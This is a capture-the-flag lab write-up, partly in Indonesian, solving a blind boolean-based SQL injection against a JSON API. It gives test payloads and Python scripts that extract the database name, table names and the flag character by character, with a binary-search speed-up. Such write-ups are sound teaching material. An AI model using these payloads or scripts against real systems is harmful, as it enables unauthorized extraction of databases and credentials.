# Lab H1 - Blind No Error SQL Injection (JSON Output) (Hard)

## Informasi Lab
- **Endpoint**: `/api/user?id=`
- **Tipe**: Blind Injection dengan JSON Response
- **Hint**: None - JSON output

## Analisis

### 1. Response JSON
```json
{
  "status": "success",
  "data": {
    "id": "1",
    "user": "admin",
    "hash": "5f4dcc3b5aa765d61d8327deb882cf99"
  }
}
```

### 2. Error Response
```json
{
  "status": "error",
  "message": "Not found"
}
```

### 3. No SQL Error
Tidak ada pesan error SQL yang ditampilkan, hanya status success/error.

## Solusi

### Langkah 1 - Konfirmasi Vulnerable
```
?id=1 AND 1=1  → {"status":"success",...}
?id=1 AND 1=2  → {"status":"error","message":"Not found"}
```

### Script Python untuk Automasi

```python
import requests
import json

url = "http://localhost/h1/api/user"

def check(condition):
    params = {"id": f"1 AND ({condition})"}
    r = requests.get(url, params=params)
    try:
        data = r.json()
        return data.get("status") == "success"
    except:
        return False

# Get database length
print("Getting database length...")
for i in range(1, 30):
    if check(f"LENGTH(database())={i}"):
        print(f"Database length: {i}")
        break

# Get database name
print("Getting database name...")
db_name = ""
for i in range(1, 10):
    for c in "abcdefghijklmnopqrstuvwxyz_":
        if check(f"ASCII(SUBSTRING(database(),{i},1))={ord(c)}"):
            db_name += c
            print(f"Database: {db_name}")
            break

# Get table names
print("Getting tables...")
tables = ""
for i in range(1, 100):
    found = False
    for c in "abcdefghijklmnopqrstuvwxyz,_":
        if check(f"ASCII(SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1))={ord(c)}"):
            tables += c
            print(f"Tables: {tables}")
            found = True
            break
    if not found:
        break

# Get flag
print("Getting flag...")
flag = ""
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}IDS"

for i in range(1, 25):
    found = False
    for c in charset:
        if check(f"ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{i},1))={ord(c)}"):
            flag += c
            print(f"Flag: {flag}")
            found = True
            break
    if not found:
        break

print(f"\nFinal Flag: {flag}")
```

### Binary Search Optimization

```python
def binary_search_char(position, query):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)

# Get flag with binary search
flag = ""
query = "SELECT flag FROM flags LIMIT 1"
for i in range(1, 20):
    char = binary_search_char(i, query)
    if char:
        flag += char
        print(f"Flag: {flag}")
    else:
        break
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Parse JSON response untuk menentukan kondisi true/false
- Gunakan binary search untuk efisiensi
- Blind injection membutuhkan banyak request
